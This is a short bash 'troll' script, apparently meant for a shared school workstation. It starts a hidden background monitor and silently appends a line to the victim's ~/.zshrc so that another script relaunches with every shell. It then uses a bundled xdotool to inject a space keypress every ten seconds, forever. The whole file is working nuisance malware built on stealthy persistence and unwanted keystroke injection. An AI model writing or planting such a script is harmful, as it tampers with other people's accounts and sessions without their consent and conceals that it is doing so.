#!/bin/bash
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/space.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/space.sh > /dev/null 2>&1 &
EOF
fi
XDOTOOL_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/bin/xdotool"
export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"

if [ ! -x "$XDOTOOL_PATH" ]; then
    exit 1
fi

cleanup() {
    exit 0
}

trap cleanup SIGINT SIGTERM

while true; do
    sleep 10
    
    $XDOTOOL_PATH key space
done
